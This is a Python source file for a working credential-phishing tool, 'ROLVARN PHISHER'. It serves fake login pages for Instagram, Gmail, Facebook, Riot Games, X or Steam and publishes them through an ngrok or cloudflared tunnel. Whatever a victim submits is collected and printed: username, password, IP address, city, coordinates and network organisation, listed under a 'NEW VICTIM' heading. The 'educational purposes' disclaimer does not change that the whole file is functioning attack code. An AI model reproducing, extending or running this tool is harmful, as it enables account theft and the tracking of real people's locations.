from aiohttp import web
from pyngrok import ngrok,conf
from colorama import Fore,Style
import subprocess
import re
import datetime 

routes = web.RouteTableDef()

print(Fore.RED + f"""                                                                                                                                                                            
 ██▀███   ▒█████   ██▓  ██▒   █▓ ▄▄▄       ██▀███   ███▄    █ 
▓██ ▒ ██▒▒██▒  ██▒▓██▒ ▓██░   █▒▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒██░  ██▒▒██░  ▓██  █▒░▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒██   ██░▒██░   ▒██ █░░░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒
░██▓ ▒██▒░ ████▓▒░░██████▒▒▀█░   ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▐░   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░░ ░░    ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░
  ░░   ░ ░ ░ ░ ▒    ░ ░     ░░    ░   ▒     ░░   ░    ░   ░ ░ 
   ░         ░ ░      ░  ░   ░        ░  ░   ░              ░ 
                            ░                                 
 ██▓███   ██░ ██  ██▓  ██████  ██░ ██ ▓█████  ██▀███          
▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒        
▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒███   ▓██ ░▄█ ▒        
▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄          
▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░▒████▒░██▓ ▒██▒        
▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░        
░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░        
░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░   ░     ░░   ░         
          ░  ░  ░ ░        ░   ░  ░  ░   ░  ░   ░                

                                                    by ~ ROLVARN
This tool is only for educational purposes.
{Fore.WHITE}================================================================={Style.RESET_ALL}                                                                 
""")

print(Fore.GREEN+"[#] "+Fore.WHITE+ "Select Option :\n")
print(Fore.YELLOW + "[1] " + Fore.WHITE + "Instagram\t" +
      Fore.YELLOW + "[6] " + Fore.WHITE + "Steam")

print(Fore.YELLOW + "[2] " + Fore.WHITE + "Gmail")
print(Fore.YELLOW + "[3] " + Fore.WHITE + "Facebook")
print(Fore.YELLOW + "[4] " + Fore.WHITE + "Riot Games")
print(Fore.YELLOW + "[5] " + Fore.WHITE + "X\n")

sitetemplate = input("> ")

if sitetemplate == "1":
    sitetype = "instagram_index.html"
elif sitetemplate == "2":
    sitetype = "gmail_index.html"
elif sitetemplate == "3":
    sitetype = "facebook_index.html"
elif sitetemplate == "4":
    sitetype = "riotgames_index.html"
elif sitetemplate == "5":
    sitetype = "x_index.html"
elif sitetemplate == "6":
    sitetype = "steam_index.html"

print(Fore.GREEN+"\n[1] "+Fore.WHITE+ "ngrok")
print(Fore.GREEN+"[2] "+Fore.WHITE+ "cloudflared")
sesion_id = input(Fore.WHITE+ "\n> ")

if sesion_id == "1":
    print(Fore.GREEN+"\n[#] "+Fore.WHITE+"Ngrok successfully selected.")
    print(Fore.GREEN + "[#] "+ Fore.WHITE+"Please wait.")    
    tunnel = ngrok.connect(8000)
    purl = tunnel.public_url
    print(Fore.GREEN+"\n[#] "+ Fore.WHITE+ "Phishing URL > " + Fore.YELLOW + purl)
    print("\n=================================================================")

elif sesion_id == "2":
    print(Fore.GREEN+"\n[#] "+Fore.WHITE+"Cloudflared successfully selected.")
    print(Fore.GREEN + "[#] "+ Fore.WHITE+"Please wait.")
    
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    link = None 
    for line in proc.stdout:
        match = re.search(r'https?://[^\s]+\.trycloudflare\.com', line)
        if match:
            link = match.group(0)
            break

    if link:
        print(Fore.GREEN+"\n[#] "+ Fore.WHITE+ "Phishing URL > "+ Fore.YELLOW+ link)
        print("\n=================================================================")
    else:
        print("Link not found.")

@routes.get('/')
async def index(request):
    with open(sitetype, 'r', encoding='utf-8') as f:
        html = f.read()
    return web.Response(text=html, content_type='text/html')

@routes.post('/data')
async def data(request):
    data = await request.json()
    username = data.get('username')
    password = data.get('password')
    ip = data.get('ip')
    city = data.get('city')
    region = data.get('region')
    country = data.get('country')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    asn = data.get('asn')
    org = data.get('org')

    n0w = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"""
    {Fore.YELLOW}* NEW VICTIM *{Style.RESET_ALL}
    
    {Fore.GREEN}Username: {username}{Style.RESET_ALL}
    {Fore.GREEN}Password: {password}{Style.RESET_ALL}
    Time : {n0w}
    IP : {ip}
    City : {city}
    Region : {region}
    Country : {country}
    Latitude :  {latitude}
    Longitude : {longitude}
    ASN : {asn}
    ORG : {org}""")

    return web.json_response({'message': f" "})

app = web.Application()
app.add_routes(routes)

if __name__ == '__main__':
    web.run_app(app, host='127.0.0.1', port=8000, print=None)